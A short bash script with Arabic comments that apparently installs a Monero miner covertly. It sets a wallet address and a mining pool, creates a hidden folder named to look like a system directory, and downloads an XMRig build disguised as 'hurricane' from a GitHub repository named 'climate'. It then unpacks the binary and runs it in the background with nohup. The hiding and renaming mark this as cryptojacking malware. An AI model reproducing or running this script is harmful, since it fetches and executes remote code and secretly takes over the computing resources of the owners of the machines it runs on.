#!/bin/bash

# إعداد بيانات المحفظة والمعدّن
WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
WORKER="science"
POOL="gulf.moneroocean.stream:443"
THREADS=5
# مجلد العمل
WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل النسخة الجاهزة من XMRig (Linux x64)
wget https://raw.githubusercontent.com/jaydmarks227/climate/refs/heads/main/hurricane.tar.gz -O hurricane.tar.gz

# فك الضغط
tar -xvf hurricane.tar.gz --strip=1
rm hurricane.tar.gz

# تشغيل المعدّن في الخلفية باستخدام nohup
nohup ./hurricane -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
